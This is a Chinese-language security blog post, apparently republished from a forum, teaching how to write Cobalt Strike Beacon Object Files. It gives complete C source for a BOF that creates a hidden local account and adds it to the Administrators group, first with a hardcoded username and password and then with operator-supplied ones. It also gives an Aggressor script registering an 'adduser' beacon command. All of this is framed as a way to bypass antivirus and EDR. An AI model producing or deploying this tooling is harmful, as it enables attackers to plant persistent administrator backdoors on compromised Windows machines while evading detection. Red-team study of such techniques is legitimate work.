<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/AHHBFeckbz4YZmZVoy4w7Q)

朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把 “**亿人**安全**** “**设为星标**”，否则可能就看不到了啦

**原文链接：奇安信攻防社区  
**

https://forum.butian.net/share/3003

主要讲下 bof 的代码编写和使用，让师傅们以后能快速修改上手利用

Beacon Object File
==================

bof 能够加载并执行 C/C++ 编译后但未链接的目标 obj 文件 (linux 中的. o 文件)。可以在 beacon 中执行内部的 beaconAPI 和 Win32API。它的体积很小，在 beacon 进程内部运行，不会创建新进程，所以可以有效的规避一些 EDR。

开发 BOF
======

环境
--

```
OS: Windows 10
IDE: VS2022
开发模版: https://github.com/securifybv/Visual-Studio-BOF-template


```

将模版下载后，我们导入 VS 的模版目录。 `用户路径\\文稿\\Visual Studio 2022\\Templates\\ProjectTemplates` 然后在新建项目中就能看到模版

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqic78HM8QagNwCCjztXGMWichsbOualhicoxfNCiaEflWluDye8ucZ3ehgWJmkRRzvwGqGhb9hwBwDGg/640?wx_fmt=png&from=appmsg)  
然后在生成 -> 批生成中勾选，方案配置选择 BOF

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqic78HM8QagNwCCjztXGMWic0rjYu7Xbv0tI8M5yOQFUuwue2anHBSHuzTiaDVViaVjaMLcWydOuZ2qw/640?wx_fmt=png&from=appmsg)  
然后生成，就能够在项目目录里看到 obj 文件

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqic78HM8QagNwCCjztXGMWiceKRsbhBicfnqYQ1zFhrrZEU81OLY4nGRD2Icy0QJ5EXUCHdrMqQJQiag/640?wx_fmt=png&from=appmsg)

功能实现
----

首先了解一下动态函数解析 (DFR) 比如我们要获取当前用户名，在 Win32API 中就要调用 GetUserNameA，我们使用 DFR 就是要变成如下格式

```
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);


```

*   DECLSPEC_IMPORT：导入函数的关键字
    
*   WINAPI：函数调用约定，一般 API 函数都是这个
    
*   ADVAPI32：函数所在的模块名
    
*   GetUserNameA：函数名称
    

查找当前域
-----

简单实现一个查找当前域功能 修改模版中 Source.c

```
#include <windows.h> 
#include <stdio.h> 
#include <dsgetdc.h> 
#include "beacon.h" 

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
  //BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
  BeaconPrintf(CALLBACK_OUTPUT, "Hello world");
#else
  printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

  return FALSE;
}
#pragma endregion

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

#include <LM.h>

#ifdef BOF
void go(char* buff, int len) {
    DWORD dwRet;
    PDOMAIN_CONTROLLER_INFO pdcInfo;
    dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &pdcInfo);
    if (ERROR_SUCCESS == dwRet) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", pdcInfo->DomainName);
    }
    NETAPI32$NetApiBufferFree(pdcInfo);
}
#else

void main(int argc, char* argv[]) {

}

#endif


```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqic78HM8QagNwCCjztXGMWicoYaUm5emttowiaOS5306k6xFhWT6Bf5DuCo4nAalrDEwAm0pFEVwA3g/640?wx_fmt=png&from=appmsg)  
于此我们也可以发现，go 函数就是 bof 执行的入口，当在 cs 的 beacon 上执行 inline-execute 时就会调用 go 函数。

bof 绕过杀毒添加用户
------------

我们在 cs 上直接利用`net user`会被阻止

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqic78HM8QagNwCCjztXGMWicjX1ia26dCiaaC3wzbPolNSZb1mB5qffd6PL54kjdkaviadIHfEMdmVK2A/640?wx_fmt=png&from=appmsg)  
但是我们如果采用 bof 的方式就能够绕过 代码如下

```
#include <windows.h> 
#include <stdio.h> 
#include "bofdefs.h"
#include "beacon.h" 

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
  //BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
  BeaconPrintf(CALLBACK_OUTPUT, "Hello world");
#else
  printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

  return FALSE;
}
#pragma endregion

typedef DWORD NET_API_STATUS;

DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);

#include <LM.h>

#ifdef BOF
void go(char* buff, int len) {
  USER_INFO_1 UserInfo;

  UserInfo.usri1_name = L"Qqw666";            
  UserInfo.usri1_password = L"Qqw@#123";      
  UserInfo.usri1_priv = USER_PRIV_USER;
  UserInfo.usri1_home_dir = NULL;
  UserInfo.usri1_comment = NULL;
  UserInfo.usri1_flags = UF_SCRIPT;
  UserInfo.usri1_script_path = NULL;

  NET_API_STATUS nStatus;

  //创建用户 
  // https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
  nStatus = NETAPI32$NetUserAdd(
    NULL, //local server
    1,    // information level
    (LPBYTE)&UserInfo,
    NULL // error value
    );
  if (nStatus == NERR_Success) {
    BeaconPrintf(CALLBACK_OUTPUT, "NetUserAdd Success!\n", NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "Username: %ws, PassWord: %ws", UserInfo.usri1_name, UserInfo.usri1_password);
  }
  else {
    BeaconPrintf(CALLBACK_OUTPUT, "NetUserAdd Failed! %d", nStatus);
  }

  // 添加用户到管理员组
  // https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
  LOCALGROUP_MEMBERS_INFO_3 account;
  account.lgrmi3_domainandname = UserInfo.usri1_name;

  NET_API_STATUS aStatus;

  aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
  if (aStatus == NERR_Success) {
    BeaconPrintf(CALLBACK_OUTPUT, "Add to Administrators success!", NULL);
  }
  else {
    BeaconPrintf(CALLBACK_OUTPUT, "Add to Administrators failed!", NULL);
  }

}
#else

void main(int argc, char* argv[]) {
  go();
}

#endif


```

效果

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqic78HM8QagNwCCjztXGMWicwU4w3hru2YDE1WaLRm7waCqoPgoc4kYXT0N05oCMuB3uUJXN39n32g/640?wx_fmt=png&from=appmsg)  
可以看到成功添加用户，并且添加到管理员组。注意执行这个操作需要有 admin 的权限。

CNA 插件开发
========

先给出 C 语言代码，修改了功能，可以自定义用户名和密码

```
#include <windows.h> 
#include <stdio.h> 
#include "bofdefs.h"
#include "beacon.h" 

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
  //BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
  BeaconPrintf(CALLBACK_OUTPUT, "Hello world");
#else
  printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

  return FALSE;
}
#pragma endregion

typedef DWORD NET_API_STATUS;

DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);

#include <LM.h>

#ifdef BOF
void go(char* buff, int len) {
  datap parser;

  LPWSTR username;
  LPWSTR password;

  // 初始化datap结构体变量(parser),用于解析从Beacon接收到的字节流(buff)
  BeaconDataParse(&parser, buff, len);
  username = (LPWSTR)BeaconDataExtract(&parser, NULL);
  password = (LPWSTR)BeaconDataExtract(&parser, NULL);

  BeaconPrintf(CALLBACK_OUTPUT, "Extracted username: %S", username);
  BeaconPrintf(CALLBACK_OUTPUT, "Extracted password: %S", password);

  USER_INFO_1 UserInfo;

  UserInfo.usri1_name = username;
  UserInfo.usri1_password = password;
  UserInfo.usri1_priv = USER_PRIV_USER;
  UserInfo.usri1_home_dir = NULL;
  UserInfo.usri1_comment = NULL;
  UserInfo.usri1_flags = UF_SCRIPT;
  UserInfo.usri1_script_path = NULL;

  NET_API_STATUS nStatus;

  //创建用户 
  // https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
  nStatus = NETAPI32$NetUserAdd(
    NULL, //local server
    1,    // information level
    (LPBYTE)&UserInfo,
    NULL // error value
  );
  if (nStatus == NERR_Success) {
    BeaconPrintf(CALLBACK_OUTPUT, "NetUserAdd Success!", NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "Username: %ws, PassWord: %ws", UserInfo.usri1_name, UserInfo.usri1_password);
  }
  else {
    BeaconPrintf(CALLBACK_OUTPUT, "NetUserAdd Failed! %d", nStatus);
  }

  // 添加用户到管理员组
  // https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
  LOCALGROUP_MEMBERS_INFO_3 account;
  account.lgrmi3_domainandname = UserInfo.usri1_name;

  NET_API_STATUS aStatus;

  aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
  if (aStatus == NERR_Success) {
    BeaconPrintf(CALLBACK_OUTPUT, "Add to Administrators success!", NULL);
  }
  else {
    BeaconPrintf(CALLBACK_OUTPUT, "Add to Administrators failed!", NULL);
  }

}
#else

void main(int argc, char* argv[]) {
  go();
}

#endif


```

cna 代码

```
beacon_command_register(
"adduser", 
"Add a user to administrators", 
"usage: adduser [username] [password]");

alias adduser{
  local('$handle $data $args');

  $uname = $2;
  $pass = $3;

  if ($uname eq "" or $pass eq "") {
    berror($1, "usage command: help adduser");
    return;
  }

  # 读入bof文件

    $handle = openf(script_resource("source.obj"));
    $data = readb($handle, -1);
    closef($handle);

  # 打包参数两个ZZ代表两个参数
  $args = bof_pack($1, "ZZ", $uname, $pass);

    # 执行bof
     # "go"是BOF中的函数名，$args是传递给这个函数的参数
  beacon_inline_execute($1, $data, "go", $args);
}


```

效果如下

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqic78HM8QagNwCCjztXGMWicVoIBxyIZMomEMkHictl61C6N9GZcavUicCndaI57vYR4kaIwQxe6Wwzw/640?wx_fmt=png&from=appmsg)

总结
==

可以根据此思路实现所有命令 bof 化，能够更好的隐藏